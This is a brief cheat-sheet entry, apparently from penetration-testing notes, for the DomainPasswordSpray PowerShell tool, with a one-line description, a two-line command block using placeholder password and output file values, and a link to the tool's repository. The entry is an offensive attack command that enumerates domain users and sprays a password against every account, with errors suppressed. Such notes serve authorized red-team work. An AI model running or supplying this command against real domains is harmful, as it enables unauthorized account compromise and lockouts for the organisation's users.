Enumerates domain users and simultaneously performs a password spraying attack against them. 

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASS> -OutFile <FILE> -ErrorAction SilentlyContinue
```

https://github.com/dafthack/DomainPasswordSpray
